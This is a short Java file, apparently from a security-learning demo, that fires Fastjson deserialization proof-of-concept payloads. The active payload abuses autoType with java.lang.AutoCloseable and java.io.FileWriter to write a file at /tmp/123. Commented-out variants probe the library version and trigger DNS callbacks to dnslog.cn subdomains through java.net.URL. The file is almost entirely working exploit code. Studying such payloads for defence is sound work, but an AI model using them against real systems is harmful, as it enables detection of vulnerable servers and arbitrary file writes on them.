package com.javasec.learndemo.web.fastjson;

import com.alibaba.fastjson.*;
import java.io.FileOutputStream;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
//import org.python.antlr.ast.Str;

public class FastJson {
    public static void main(String[] args){
        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        //String poc1 = "{{\"@type\":\"java.net.URL\",\"val\":\"http://94uiij.dnslog.cn\"}:0\n";
        // 探测版本号
        //String poc1 = "{\"@type\":\"java.lang.AutoCloseable\"";
        // dnslog
        //String poc1 = "{\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"http://t78vkd.dnslog.cn\"}}\"\"}";
        String poc1 = "{\n" +
                "    \"@type\":\"java.lang.AutoCloseable\",\n" +
                "    \"@type\":\"java.io.FileWriter\",\n" +
                "    \"file\":\"/tmp/123\",\n" +
                "    \"append\":false\n" +
                "}";
        JSON.parseObject(poc1);
    }
}
